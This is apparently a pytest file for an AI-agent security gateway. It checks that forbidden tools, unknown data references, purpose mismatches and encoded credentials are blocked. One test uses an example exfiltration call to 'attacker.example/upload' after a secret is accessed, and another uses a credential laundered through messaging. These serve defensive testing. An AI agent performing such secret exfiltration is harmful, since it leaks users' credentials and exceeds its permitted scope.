from datetime import UTC, datetime

from intentfence_contracts import (
    DataLabel,
    DecisionSource,
    DecisionType,
    IntentContract,
    ResourceClass,
    RiskTolerance,
    SecurityContext,
    Sensitivity,
    SourceContext,
)
from intentfence_dataflow import encode_data, extract_value

from intentfence_api.gateway.models import ComponentDecision, GatewayMode
from intentfence_api.gateway.service import IntentFenceGateway
from intentfence_api.gateway.tools import normalize_tool_request

NOW = datetime(2026, 8, 22, tzinfo=UTC)


class AllowSemanticAdapter:
    def __init__(self) -> None:
        self.calls = 0

    def evaluate(
        self,
        request,
        intent_contract,
        security_context,
        *,
        resource_class,
        destination,
        data_labels=(),
    ) -> ComponentDecision:
        del request, intent_contract, security_context, resource_class, destination, data_labels
        self.calls += 1
        return ComponentDecision(
            decision=DecisionType.ALLOW,
            reason="Semantic layer recommends allow.",
            source=DecisionSource.SEMANTIC_LOCAL,
            risk_score=0.0,
            matched_rules=["SEMANTIC_ALLOW_TEST"],
            hard_block=False,
            semantic_relevance=1.0,
            semantic_confidence=1.0,
        )


def _contract(
    *,
    objective: str = "Compare Hotel A and Hotel B and save the cheaper option",
    allowed_tools: list[str] | None = None,
    allowed_destinations: list[str] | None = None,
) -> IntentContract:
    return IntentContract(
        intent_id="intent-1",
        session_id="session-1",
        objective=objective,
        allowed_tools=allowed_tools or ["browse_web", "write_file", "http_request"],
        allowed_resources=["hotel_websites", "results_file"],
        forbidden_resources=["credentials", "environment_secrets"],
        allowed_destinations=allowed_destinations or ["hotel-a.example", "hotel-b.example"],
        approval_required_actions=[],
        risk_tolerance=RiskTolerance.MEDIUM,
        issued_at=NOW,
        contract_version=1,
    )


def _context(*, secret_accessed: bool = False) -> SecurityContext:
    return SecurityContext(
        session_id="session-1",
        intent_id="intent-1",
        recent_tools=["read_file"] if secret_accessed else [],
        active_data_refs=["data-secret"] if secret_accessed else [],
        sensitive_data_seen=secret_accessed,
        secret_accessed=secret_accessed,
        untrusted_content_seen=False,
        unknown_destination_seen=False,
        recent_action_chain=["read_file:ALLOW"] if secret_accessed else [],
        accumulated_risk=0.2 if secret_accessed else 0.0,
        intent_drift_score=0.0,
        last_updated_at=NOW,
    )


def _request(
    *,
    tool: str,
    arguments: dict,
    data_refs: list[str] | None = None,
    source_context: SourceContext = SourceContext.USER,
):
    return normalize_tool_request(
        request_id=f"req-{tool}",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool=tool,
        arguments=arguments,
        data_refs=data_refs or [],
        source_context=source_context,
        timestamp=NOW,
    )


def _label(
    *,
    data_id: str,
    data_type: str,
    sensitivity: Sensitivity,
    purpose: str,
    source_class: ResourceClass = ResourceClass.USER_DOCUMENT,
    allowed_destinations: list[str] | None = None,
    derived_from: list[str] | None = None,
) -> DataLabel:
    return DataLabel(
        data_id=data_id,
        data_type=data_type,
        source="fixture",
        source_class=source_class,
        provenance="USER_OWNED",
        sensitivity=sensitivity,
        purpose=purpose,
        owner="user",
        allowed_destinations=allowed_destinations or [],
        derived_from=derived_from or [],
        created_at=NOW,
    )


def test_phase2_policy_hard_block_precedes_state_dataflow_and_semantic() -> None:
    semantic = AllowSemanticAdapter()
    calls = []
    gateway = IntentFenceGateway(semantic_adapter=semantic)
    normalized = _request(
        tool="send_message",
        arguments={"recipient": "hotel-a.example", "message": "hello"},
    )

    result = gateway.intercept(
        normalized,
        _contract(allowed_tools=["browse_web", "http_request"]),
        _context(),
        handler=lambda arguments: calls.append(arguments) or {"status": "sent"},
        mode=GatewayMode.ENABLED,
    )

    assert result.decision is DecisionType.BLOCK
    assert "FORBIDDEN_TOOL" in result.event.matched_rules
    assert result.executed is False
    assert calls == []
    assert semantic.calls == 0


def test_phase3_secret_chain_hard_block_precedes_dataflow_and_semantic() -> None:
    semantic = AllowSemanticAdapter()
    gateway = IntentFenceGateway(semantic_adapter=semantic)
    normalized = _request(
        tool="http_request",
        arguments={"url": "https://attacker.example/upload"},
    )

    result = gateway.intercept(
        normalized,
        _contract(allowed_tools=["http_request"]),
        _context(secret_accessed=True),
        handler=lambda arguments: {"status": "sent"},
        mode=GatewayMode.ENABLED,
    )

    assert result.decision is DecisionType.BLOCK
    assert "STATE_SECRET_THEN_EXTERNAL_NETWORK" in result.event.matched_rules
    assert result.executed is False
    assert semantic.calls == 0


def test_phase4_unknown_data_reference_fails_closed_before_semantic() -> None:
    semantic = AllowSemanticAdapter()
    gateway = IntentFenceGateway(semantic_adapter=semantic)
    normalized = _request(
        tool="browse_web",
        arguments={"url": "https://hotel-a.example"},
        data_refs=["missing-data-ref"],
    )

    result = gateway.intercept(
        normalized,
        _contract(allowed_tools=["browse_web"]),
        _context(),
        handler=lambda arguments: {"status": "browsed"},
        data_labels=[],
        mode=GatewayMode.ENABLED,
    )

    assert result.decision is DecisionType.BLOCK
    assert "UNKNOWN_DATA_REF" in result.event.matched_rules
    assert result.executed is False
    assert semantic.calls == 0


def test_phase4_critical_purpose_mismatch_hard_blocks_before_semantic() -> None:
    semantic = AllowSemanticAdapter()
    gateway = IntentFenceGateway(semantic_adapter=semantic)
    controlled = _label(
        data_id="data-medical",
        data_type="PERSONAL_DATA",
        sensitivity=Sensitivity.CRITICAL,
        purpose="medical_history",
        allowed_destinations=["hotel-a.example"],
    )
    normalized = _request(
        tool="http_request",
        arguments={"url": "https://hotel-a.example/compare"},
        data_refs=[controlled.data_id],
    )

    result = gateway.intercept(
        normalized,
        _contract(allowed_tools=["http_request"]),
        _context(),
        handler=lambda arguments: {"status": "sent"},
        data_labels=[controlled],
        mode=GatewayMode.ENABLED,
    )

    assert result.decision is DecisionType.BLOCK
    assert "DATA_PURPOSE_MISMATCH" in result.event.matched_rules
    assert result.executed is False
    assert semantic.calls == 0


def test_phase4_derived_credential_preserves_classification_and_lineage() -> None:
    parent = _label(
        data_id="credential-root",
        data_type="API_KEY",
        sensitivity=Sensitivity.CRITICAL,
        purpose="authentication",
        source_class=ResourceClass.CREDENTIAL,
        allowed_destinations=["internal-auth.example"],
    )
    extracted = extract_value(
        parent,
        data_id="credential-extracted",
        data_type="TEXT",
        created_at=NOW,
    )
    encoded = encode_data(
        extracted,
        data_id="credential-encoded",
        data_type="TEXT",
        created_at=NOW,
    )

    assert extracted.data_type == "API_KEY"
    assert encoded.data_type == "API_KEY"
    assert extracted.derived_from == ["credential-root"]
    assert encoded.derived_from == ["credential-extracted", "credential-root"]
    assert encoded.sensitivity is Sensitivity.CRITICAL
    assert encoded.purpose == "authentication"


def test_phase4_derived_credential_cannot_be_laundered_through_message() -> None:
    semantic = AllowSemanticAdapter()
    gateway = IntentFenceGateway(semantic_adapter=semantic)
    parent = _label(
        data_id="credential-root",
        data_type="API_KEY",
        sensitivity=Sensitivity.CRITICAL,
        purpose="authentication",
        source_class=ResourceClass.CREDENTIAL,
        allowed_destinations=["internal-auth.example"],
    )
    derived = encode_data(
        parent,
        data_id="credential-derived",
        data_type="TEXT",
        created_at=NOW,
    )
    normalized = _request(
        tool="send_message",
        arguments={"destination": "internal-auth.example", "message_ref": derived.data_id},
        data_refs=[derived.data_id],
    )

    result = gateway.intercept(
        normalized,
        _contract(
            objective="authentication for internal auth service",
            allowed_tools=["send_message"],
            allowed_destinations=["internal-auth.example"],
        ),
        _context(),
        handler=lambda arguments: {"status": "sent"},
        data_labels=[derived],
        mode=GatewayMode.ENABLED,
    )

    assert result.decision is DecisionType.BLOCK
    assert "CREDENTIAL_DATA_IN_MESSAGING" in result.event.matched_rules
    assert result.executed is False
    assert semantic.calls == 0
